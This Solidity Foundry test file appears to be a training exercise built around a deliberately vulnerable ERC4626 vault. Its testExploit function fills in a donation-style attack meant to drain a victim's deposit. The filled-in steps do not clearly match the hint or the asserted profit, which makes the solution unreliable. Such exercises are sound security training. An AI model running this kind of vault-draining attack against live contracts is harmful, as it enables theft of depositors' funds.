// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/ERC4626-v1/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
}

contract VaultExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    address public player;
    address public victim;

    function setUp() public {
        token = new MockERC20();
        vault = new VulnerableVault(IERC20(address(token)));
        
        player = makeAddr("player");
        victim = makeAddr("victim");

        // Give some tokens to the player and victim
        token.transfer(player, 1000 * 10**token.decimals());
        token.transfer(victim, 10000 * 10**token.decimals());

        // Victim deposits into the vault
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10000 * 10**token.decimals(), victim);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(player);

        // Initial balances
        uint256 initialPlayerBalance = token.balanceOf(player);
        uint256 initialVaultBalance = token.balanceOf(address(vault));

        console.log("Initial player balance:", initialPlayerBalance);
        console.log("Initial vault balance:", initialVaultBalance);

        // TODO: Exploit the vault here
        // Hint: The vulnerability is in the previewDeposit function
        // Your goal is to drain the victim's funds from the vault

        // Step 1: Approve the vault to spend your tokens
        token.approve(address(vault), type(uint256).max);

        // Step 2: Deposit a small amount to get shares
        uint256 smallDeposit = 1 * 10**token.decimals();
        vault.deposit(smallDeposit, player);

        // Step 3: Transfer a large amount of tokens directly to the vault
        uint256 largeTransfer = 999 * 10**token.decimals();
        token.transfer(address(vault), largeTransfer);

        // Step 4: Withdraw all your shares
        uint256 playerShares = vault.balanceOf(player);
        vault.withdraw(vault.convertToAssets(playerShares), player, player);

        vm.stopPrank();

        // Final balances
        uint256 finalPlayerBalance = token.balanceOf(player);
        uint256 finalVaultBalance = token.balanceOf(address(vault));

        console.log("Final player balance:", finalPlayerBalance);
        console.log("Final vault balance:", finalVaultBalance);

        // Check if the exploit was successful
        assertGt(finalPlayerBalance, initialPlayerBalance, "Player should have more tokens than initial balance");
        assertLt(finalVaultBalance, initialVaultBalance / 2, "Vault should have less than half of its initial balance");
    }
}